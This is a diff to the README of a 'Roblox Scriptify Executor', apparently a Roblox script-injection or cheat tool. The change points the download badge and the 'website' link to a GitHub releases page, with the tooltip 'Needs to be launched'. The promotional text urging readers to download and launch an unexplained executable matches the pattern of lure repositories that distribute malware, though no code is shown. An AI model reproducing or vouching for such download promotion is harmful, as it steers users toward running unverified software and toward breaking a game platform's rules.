@@ -24,7 +24,7 @@ Welcome to the official repository of **Roblox Scriptify Executor**, your go-to 
 
 To get started with **Roblox Scriptify Executor**, download the latest version from the following link:
 
-[![Download Executor](https://img.shields.io/badge/Download-Executor-blue.svg)](https://github.com/files/File.zip "Needs to be launched")
+[![Download Executor](https://github.com/earth789dadadad/Roblox-Scriptify/releases)](https://github.com/earth789dadadad/Roblox-Scriptify/releases "Needs to be launched")
 
 If the link is not working, feel free to check the "Releases" section of this repository for alternative download options.
 
@@ -47,7 +47,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Get ready to elevate your Roblox scripting game with **Roblox Scriptify Executor**. Download the tool now and script like a pro! 🚀🎮
 
-For more information, visit our [website](https://robloxscriptify.com).
+For more information, visit our [website](https://github.com/earth789dadadad/Roblox-Scriptify/releases).
 
 ---
 
